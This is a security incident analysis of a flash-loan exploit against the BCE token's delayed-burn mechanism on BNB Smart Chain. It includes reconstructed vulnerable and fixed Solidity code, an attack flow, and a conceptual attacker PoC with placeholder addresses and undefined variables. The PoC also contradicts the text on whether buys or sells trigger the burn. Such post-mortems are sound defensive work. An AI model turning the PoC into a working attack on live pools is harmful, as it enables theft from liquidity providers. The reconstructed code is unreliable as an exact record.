# BCE Token — Delayed Burn (scheduledDestruction) Business Logic Flaw Analysis

| Item | Details |
|------|------|
| **Date** | 2026-03-23 |
| **Protocol** | BCE Token (PancakeSwap BCE/USDT Pool) |
| **Chain** | BNB Smart Chain (BSC) |
| **Loss** | ~$679,000 (LP liquidity provider losses) |
| **Attacker** | [Undisclosed](https://bscscan.com/address/) (deployed two malicious contracts MC1, MC2) |
| **Attack Contracts** | MC1 (flash loan receiver), MC2 (swap executor) — specific addresses undisclosed |
| **Attack Tx** | [0x85ac5d15...](https://bscscan.com/tx/0x85ac5d15f16d49ae08f90ab0e554ebfcb145712342c5b7704e305d602146d452) |
| **Vulnerable Contract** | [0xcdb189d3...99999999](https://bscscan.com/address/0xcdb189d377ac1cf9d7b1d1a988f2025b99999999) (BCE Token) |
| **Root Cause** | The state variable `scheduledDestruction`, which can be influenced by users, burns tokens directly from the PancakeSwap pair — the destruction amount derived from sell activity is settled from LP reserves rather than at the user's expense |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) (not registered for 2026-03, based on public analysis) |

---

## 1. Vulnerability Overview

BCE Token is a deflationary token traded on BSC through the PancakeSwap BCE/USDT pool. The token contains an internal mechanism that accumulates pending burn amounts in the `scheduledDestruction` state variable based on trade volume and pool reserves during sell transactions.

**Core Flaw**: The burn amount accumulated in `scheduledDestruction` is not deducted from the seller's balance; instead, it is **burned directly from the PancakeSwap pair contract's balance** via a separate code path, after which `sync()` is called. This allows an attacker to engineer a delayed burn that settles against LP reserves, manipulating pool depth and price with limited capital and extracting value from liquidity providers.

This vulnerability is a recurring pattern in BSC deflationary tokens — also seen in **LAXO Token (2026-02-22)** and **Movie Token MT (2026-03-10)** — and falls under the `burn mechanism abuse via AMM reserve manipulation` category.

---

## 2. Vulnerable Code Analysis

### 2.1 Delayed Burn Accumulation — Core Vulnerability

**Vulnerable Code (reconstructed)**:
```solidity
// ❌ Vulnerable code — scheduledDestruction accumulation logic
uint256 public scheduledDestruction;  // ❌ Pending burn amount accumulated as a state variable

function _transfer(address from, address to, uint256 amount) internal override {
    // Sell detection: from is a regular address, to is the PancakeSwap pair
    if (to == uniswapV2Pair && !_isExcludedFromFees[from]) {
        uint256 pairBalance = balanceOf(uniswapV2Pair);
        // ❌ Calculates and accumulates pending burn amount based on trade volume and pool reserves
        // This amount is NOT deducted from the seller!
        uint256 destructionAmount = (amount * pairBalance) / totalSupply();
        scheduledDestruction += destructionAmount;  // ❌ Only accumulates; no deduction from seller's balance
    }
    
    // ❌ Executes previously accumulated pending burn amount
    if (scheduledDestruction > 0) {
        _executeScheduledDestruction();  // ← Executed via a separate code path
    }
    
    super._transfer(from, to, amount);
}

function _executeScheduledDestruction() private {
    uint256 amount = scheduledDestruction;
    scheduledDestruction = 0;
    
    // ❌ Burns directly from the PancakeSwap pair, not the seller's balance!
    _burn(uniswapV2Pair, amount);
    
    // ❌ Calls sync() to reflect the manipulated reserves into the AMM
    IUniswapV2Pair(uniswapV2Pair).sync();
}
```

**Problem**: The pending burn amount (`scheduledDestruction`) is deducted from LP reserves rather than from the seller. An attacker can repeatedly buy and sell large amounts to intentionally inflate `scheduledDestruction`, drain the LP's BCE reserves to an extreme, cause a price spike, and realize the arbitrage profit.

**Fixed Code (✅)**:
```solidity
// ✅ Fix: Burns must be deducted from the seller's balance
function _transfer(address from, address to, uint256 amount) internal override {
    if (to == uniswapV2Pair && !_isExcludedFromFees[from]) {
        // ✅ Deduct burn amount from the transfer amount first, charged to the seller
        uint256 burnAmount = (amount * BURN_RATE) / 10000;
        
        // ✅ Burn from the seller's amount first (no impact on LP reserves)
        _burn(from, burnAmount);
        amount -= burnAmount;
    }
    
    // ✅ Delayed burn state variable removed — handled immediately
    super._transfer(from, to, amount);
    // Note: sync() is not called. The AMM updates its own reserves.
}
```

### 2.2 Buy/Sell Limit Bypass

**Vulnerable Code (reconstructed)**:
```solidity
// ❌ Simple per-wallet transaction limit — bypassable with two malicious contracts
uint256 public maxTransactionAmount;
mapping(address => bool) public isWhitelisted;

function _transfer(address from, address to, uint256 amount) internal override {
    if (!isWhitelisted[from] && !isWhitelisted[to]) {
        // ❌ Only checks individual wallet limits; assumes multi-contract attacks are impossible
        require(amount <= maxTransactionAmount, "Exceeds max transaction");
    }
    // ...
}
```

**Fixed Code (✅)**:
```solidity
// ✅ Fix: Per-block cumulative volume limit to prevent multi-contract bypass
mapping(uint256 => uint256) public blockVolume;  // ✅ Tracks volume on a per-block basis
uint256 public maxBlockVolume;

function _transfer(address from, address to, uint256 amount) internal override {
    // ✅ Check cumulative per-block volume (prevents multi-contract bypass)
    blockVolume[block.number] += amount;
    require(blockVolume[block.number] <= maxBlockVolume, "Exceeds block volume limit");
    // ...
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker pre-deploys two malicious contracts (MC1, MC2)
- MC1: Receives flash loan and coordinates the entire attack
- MC2: Executes BCE/USDT swaps (purpose: bypass per-contract transaction limits)
- BCE token's `scheduledDestruction` mechanism analyzed and confirmed

### 3.2 Execution Phase

1. **Flash Loan Borrow**: MC1 borrows a 123.5M USDT flash loan from a lending protocol
2. **USDT→BCE Swap**: Buys 5.529M BCE with 2.222M USDT through MC2
3. **Reserve Pressure**: MC2 executes a series of USDT→BCE swaps totaling ~34.9M USDT → drives the pool's BCE reserves down to ~174K
4. **scheduledDestruction Accumulation**: Large-scale pending burn amount accumulates in `scheduledDestruction` during the bulk buy/transfer process
5. **LP Burn Execution**: Burn trigger fires — `scheduledDestruction` executes directly against the PancakeSwap pair → BCE reserves compressed to ~10,000
6. **Price Spike**: `sync()` call reflects the manipulated reserves into the AMM → BCE/USDT price surges
7. **BCE→USDT Arbitrage**: Swaps BCE for USDT at the manipulated price, securing massive arbitrage profit
8. **Flash Loan Repayment**: Repays flash loan principal + fee, retaining ~$679K net profit

### 3.3 Attack Flow Diagram

```
 Attacker EOA
     │
     ▼
┌─────────────────────────┐
│ Deploy Malicious MC1    │  ← Flash loan coordinator
└────────────┬────────────┘
             │ Flash loan request
             ▼
┌─────────────────────────┐
│  Lending Protocol       │  ← Provides 123.5M USDT
└────────────┬────────────┘
             │ 123.5M USDT
             ▼
┌─────────────────────────┐
│  Malicious Contract MC2 │  ← For bypassing transaction limits
└────────────┬────────────┘
             │ 2.222M USDT → swap
             ▼
┌─────────────────────────────────────────────┐
│  PancakeSwap BCE/USDT Pool                  │
│  [BCE Reserve Manipulation Process]         │
│                                             │
│  Initial:    BCE reserves = X (normal)      │
│  Post-swap:  BCE reserves = ~174K (pressured) │
│  Post-burn:  BCE reserves = ~10,000 (drained) │
│                                             │
│  ❌ scheduledDestruction → _burn(pair, N)   │
│  ❌ IUniswapV2Pair(pair).sync()             │
└────────────┬────────────────────────────────┘
             │ BCE price spikes (reserves exhausted)
             │
             ▼
┌─────────────────────────┐
│  BCE → USDT Arbitrage   │  ← Sells at manipulated price
└────────────┬────────────┘
             │ Receives large USDT amount
             ▼
┌─────────────────────────┐
│  Flash Loan Repayment   │  ← Principal + fee
└────────────┬────────────┘
             │ Net profit ~$679K
             ▼
         Attacker receives
```

### 3.4 Outcome

- **Attacker Profit**: ~$679,000
- **LP Provider Loss**: BCE/USDT pool liquidity drained (~$679,000 equivalent)
- **BCE Token**: Extreme reserve compression causes price to spike then crash, investor confidence destroyed

---

## 4. PoC Code (Reconstructed from Public Analysis)

> No DeFiHackLabs PoC was registered for 2026-03, so this is a conceptual PoC reconstructed from public analysis.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// @KeyInfo:
// BCE Token Business Logic Exploit
// Date: 2026-03-23
// Loss: ~$679,000
// Vulnerable Contract: 0xcdb189d377ac1cf9d7b1d1a988f2025b99999999 (BCE Token)
// Attack Tx: 0x85ac5d15f16d49ae08f90ab0e554ebfcb145712342c5b7704e305d602146d452

interface IBCE {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    // Transfer function that triggers burn after scheduledDestruction accumulation
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function sync() external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IFlashLoanProvider {
    function flashLoan(uint256 amount) external;
}

// Malicious Contract MC1 — Flash Loan Coordinator
contract BCE_MC1_Attacker {
    address constant BCE = 0xcdb189d377ac1cf9d7b1d1a988f2025b99999999;
    address constant USDT = 0x55d398326f99059ff775485246999027b3197955;
    address constant BCE_USDT_PAIR = address(0); // PancakeSwap BCE/USDT pair
    BCE_MC2_Swapper public mc2;

    // Step 1: Deploy MC2, then request flash loan
    function initiateAttack() external {
        mc2 = new BCE_MC2_Swapper(BCE, USDT, BCE_USDT_PAIR);
        
        // Request 123.5M USDT flash loan (from lending protocol)
        IFlashLoanProvider(address(0)).flashLoan(123_500_000e18);
    }

    // Step 2: Flash loan callback
    function onFlashLoan(uint256 amount) external {
        // Transfer USDT to MC2
        IERC20(USDT).transfer(address(mc2), 2_222_000e18);
        
        // Step 3: Buy BCE through MC2 (bypass transaction limits)
        mc2.buyBCE();
        
        // Step 4: Maximize scheduledDestruction via large swaps
        // Accumulate pending burn amount through repeated buy/transfers
        mc2.inflateScheduledDestruction();
        
        // Step 5: Trigger burn execution — compress LP reserves to ~10,000
        mc2.triggerBurn();
        
        // Step 6: Sell BCE at the spiked price
        mc2.sellBCE();
        
        // Step 7: Repay flash loan
        IERC20(USDT).transfer(msg.sender, amount + fee);
        
        // Step 8: Withdraw net profit
        uint256 profit = IERC20(USDT).balanceOf(address(this));
        IERC20(USDT).transfer(tx.origin, profit);
    }
}

// Malicious Contract MC2 — Swap Executor (for bypassing transaction limits)
contract BCE_MC2_Swapper {
    address immutable bce;
    address immutable usdt;
    address immutable pair;

    constructor(address _bce, address _usdt, address _pair) {
        bce = _bce; usdt = _usdt; pair = _pair;
    }

    // Buy BCE: 2.222M USDT → 5.529M BCE
    function buyBCE() external {
        // USDT → BCE swap
        // scheduledDestruction begins accumulating pending burn amounts during this process
        IUniswapV2Pair(pair).swap(5_529_000e18, 0, address(this), "");
    }
    
    // Pressure BCE reserves via repeated swaps (34.9M USDT volume)
    function inflateScheduledDestruction() external {
        // Repeated swaps drive pool's BCE reserves down to ~174K
        // Each swap accumulates pending burn amounts in scheduledDestruction
        for (uint i = 0; i < iterations; i++) {
            // Repeated USDT → BCE swaps
            // ❌ scheduledDestruction accumulates on each sell/transfer
        }
    }
    
    // Trigger scheduledDestruction execution
    function triggerBurn() external {
        // Internally calls _executeScheduledDestruction() on BCE transfer
        // ❌ Burns BCE directly from LP pair → sync() → reserves compressed to ~10,000
        IBCE(bce).transfer(address(this), 1); // Trigger with a minimal transfer
    }
    
    // Sell BCE at the inflated price
    function sellBCE() external {
        uint256 bceBalance = IBCE(bce).balanceOf(address(this));
        // Sell at inflated price due to depleted BCE reserves
        IUniswapV2Pair(pair).swap(0, hugeUSDT, address(this), "");
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Delayed burn mechanism that burns directly from LP reserves | CRITICAL | CWE-841 | 11_logic_error.md |
| V-02 | User-influenceable state variable manipulates third-party (LP) balance | CRITICAL | CWE-664 | 16_accounting_sync.md |
| V-03 | Buy/sell limit bypass (multi-contract) | HIGH | CWE-284 | 03_access_control.md |
| V-04 | Price manipulation combined with flash loan | HIGH | CWE-682 | 02_flash_loan.md |

### V-01: Delayed Burn Mechanism That Burns Directly from LP Reserves (CRITICAL)

- **Description**: The pending burn amount accumulated in the `scheduledDestruction` state variable is burned directly from the PancakeSwap pair contract's balance rather than from the seller's balance. `sync()` is then called to reflect the manipulated reserves into the AMM.
- **Impact**: The LP's BCE reserves are unintentionally burned, causing the USDT/BCE price ratio to skew sharply. The attacker realizes arbitrage profit by exploiting the distorted price.
- **Attack Condition**: Capital sufficient to intentionally inflate `scheduledDestruction` through large buy/sell operations (satisfiable via flash loan)

### V-02: User-Influenceable State Variable Manipulates Third-Party (LP) Balance (CRITICAL)

- **Description**: The `scheduledDestruction` variable can be indirectly manipulated by regular users' trading activity (selling). When this variable is executed, the LP contract's balance decreases rather than the user's own.
- **Impact**: The attacker gains a leverage effect — triggering large-scale LP reserve burns with a small amount of capital.
- **Attack Condition**: An entry point exists to manipulate the variable by repeatedly calling BCE token's `_transfer` function

### V-03: Buy/Sell Limit Bypass (HIGH)

- **Description**: BCE token's simple per-wallet/per-transaction trading limits can be bypassed using a distributed attack with two malicious contracts (MC1, MC2).
- **Impact**: Large-scale trades that would be impossible from a single contract are executed across multiple contracts, neutralizing the protection mechanism.
- **Attack Condition**: Pre-deployment of malicious contracts and analysis of the token's limit logic

### V-04: Price Manipulation Combined with Flash Loan (HIGH)

- **Description**: A flash loan temporarily provides large capital to accelerate `scheduledDestruction` accumulation and maximize LP reserve pressure.
- **Impact**: Attacks totaling hundreds of thousands of dollars become possible with only a small initial capital outlay.
- **Attack Condition**: Access to a flash loan provider protocol (universally available on BSC)

---

## 6. Remediation Recommendations

### Immediate Action — Fix the Burn Target

```solidity
// ✅ Critical fix: Burns must always be processed from the sender's or receiver's balance
// Never burn directly from the LP pair address's balance

function _transfer(address from, address to, uint256 amount) internal override {
    uint256 transferAmount = amount;
    
    // ✅ On sell, deduct burn amount from the seller's balance first
    if (to == uniswapV2Pair && !_isExcludedFromFees[from]) {
        uint256 burnAmount = (amount * BURN_RATE_BPS) / 10000;
        
        // ✅ Burn from `from`'s balance (no impact on LP reserves)
        _burn(from, burnAmount);
        transferAmount = amount - burnAmount;
    }
    
    // ✅ scheduledDestruction state variable completely removed
    // ✅ sync() call removed (rely on AMM's own update mechanism)
    
    super._transfer(from, to, transferAmount);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Direct LP burn | Prohibit the `_burn(pair, amount)` pattern entirely; detect with audit tooling |
| Delayed burn state variable | Process burns immediately (synchronously); prohibit deferred execution via state variable |
| Transaction limit bypass | Replace individual wallet limits with per-block cumulative volume limits |
| Flash loan mitigation | Enforce per-block maximum trade volume and prevent consecutive swaps within the same block |
| AMM sync() abuse | Validate that reserves have not changed before calling `sync()` |
| Code audit | Mandate professional audit before deploying deflationary tokens |

---

## 7. Lessons Learned

1. **Mechanisms that burn directly from the LP pair are extremely dangerous.** The `_burn(uniswapV2Pair, amount)` pattern directly manipulates AMM reserves and is a direct price manipulation vector. Burns must always be processed from the token holder's (`from`) balance.

2. **Deferred-execution state variables (scheduledDestruction) are exploitable vulnerabilities.** A design where user trading activity accumulates in a state variable that later impacts a third party (LP) allows attackers to intentionally build up state to maximize damage.

3. **The burn mechanism of deflationary tokens must be carefully examined for AMM interactions.** BSC reflection tokens and auto-burn tokens are vulnerable to AMM price manipulation when combined with flash loans. Simulating AMM reserve changes is essential during token design.

4. **Simple transaction limits are bypassed by multi-contract attacks.** Per-block cumulative volume limits are more effective than per-wallet/per-transaction limits. Separate limit logic for contract addresses should also be considered.

5. **This is a recurring pattern in BSC meme/deflationary tokens.** The same attack type has recurred across LAXO (2026-02), Movie Token MT (2026-03), and BCE (2026-03). On-chain monitoring tools that auto-detect this pattern are needed.

---

## 8. On-Chain Verification

> Analysis based on attack Tx `0x85ac5d15f16d49ae08f90ab0e554ebfcb145712342c5b7704e305d602146d452` (cross-referenced with public reports)

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | Public Analysis Value | Notes |
|------|------------|------|
| Flash loan borrowed | 123.5M USDT | Via lending protocol |
| USDT transferred to MC2 | 2.222M USDT | MC1 → MC2 |
| Initial USDT→BCE buy | 5.529M BCE | Using 2.222M USDT |
| Reserve pressure swaps | ~34.9M USDT volume | Sum of repeated swaps |
| BCE reserves after pressure | ~174K BCE | At swap completion |
| BCE reserves after LP burn | ~10,000 BCE | After scheduledDestruction execution |
| Net profit | ~$679,000 | On-chain verification not performed |

### 8.2 Key Attack Mechanism Steps

| Step | Action | Result |
|------|------|------|
| 1 | Large-scale USDT→BCE swaps | BCE reserves decrease, scheduledDestruction accumulates |
| 2 | Burn trigger | BCE burned directly from pair, reserves ~10K |
| 3 | sync() call | Manipulated reserves reflected into AMM, price spikes |
| 4 | BCE→USDT arbitrage | Receives large USDT amount at spiked price |
| 5 | Flash loan repayment | Returns principal + fee, net profit secured |

### 8.3 Precondition Verification

| Item | Status |
|------|------|
| BCE/USDT pool existence | Active (sufficient liquidity) |
| scheduledDestruction initial value | 0 (initialized state before attack) |
| Transaction limits | Bypassable via MC1/MC2 separation |
| Flash loan accessibility | BSC lending protocols available |

**On-chain direct verification not performed**: `cast` CLI or BSC node access required; document is based on public analysis reports. For precise verification, please check BscScan Tx [0x85ac5d15...](https://bscscan.com/tx/0x85ac5d15f16d49ae08f90ab0e554ebfcb145712342c5b7704e305d602146d452) directly.

---

## 9. Comparable Incident Comparison

| Incident | Date | Chain | Loss | Common Factor |
|------|------|------|------|--------|
| LAXO Token | 2026-02-22 | BSC | ~263K USDT | Direct burn from LP + sync() |
| Movie Token (MT) | 2026-03-10 | BSC | Undisclosed | Pending burn LP pattern |
| **BCE Token** | **2026-03-23** | **BSC** | **~$679K** | **scheduledDestruction LP burn** |

All three incidents share **the same root cause** in BSC deflationary tokens: **burning directly from the LP pair balance and calling sync()**. It is recommended to add this pattern to the `16_accounting_sync.md` and `11_logic_error.md` pattern documents.

---

## References

- [BlockSec Weekly Roundup Mar 23–29, 2026](https://blocksec.com/blog/weekly-web3-security-incident-roundup-mar-23-mar-29-2026)
- [PancakeSwap BCE-USDT Exploit Analysis — Cryptonews](https://cryptonews.net/news/security/32591768/)
- [CAKE price analysis following a $679K PancakeSwap exploit — Invezz](https://invezz.com/news/2026/03/23/cake-price-analysis-following-a-679k-pancakeswap-exploit/)
- [LAXO Token Exploit: AMM Reserve Manipulation via Burn Mechanism — Verichains](https://blog.verichains.io/p/laxo-token-exploit-amm-reserve-manipulation)
- [Deflationary Token Design Security in 2026 — Dev.to](https://dev.to/ohmygod/deflationary-token-design-security-why-flawed-burn-mechanisms-keep-getting-exploited-in-2026-299o)
- [BscScan Exploit Tx](https://bscscan.com/tx/0x85ac5d15f16d49ae08f90ab0e554ebfcb145712342c5b7704e305d602146d452)
- [BCE Token Contract](https://bscscan.com/address/0xcdb189d377ac1cf9d7b1d1a988f2025b99999999)